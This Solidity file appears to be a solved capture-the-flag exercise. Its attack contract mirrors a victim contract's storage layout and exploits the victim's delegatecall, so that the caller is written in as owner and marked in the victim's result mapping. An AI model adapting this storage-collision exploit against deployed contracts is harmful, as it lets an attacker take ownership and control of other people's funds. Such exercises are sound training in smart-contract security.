// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address public var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here
    function proxyCall(bytes calldata data) public {
        // convert data to address   
        address hacker = bytesToAddress(data);
        result[hacker] = true;
        owner = hacker;

    }

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
        addr := mload(add(bys,20))
        } 
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory hackerbyte = abi.encodePacked(msg.sender);
        bytes memory data = abi.encodeWithSignature("proxyCall(bytes)", hackerbyte);
        address temp = ID31eg4t3(victim).proxyCall(data);
    }

}
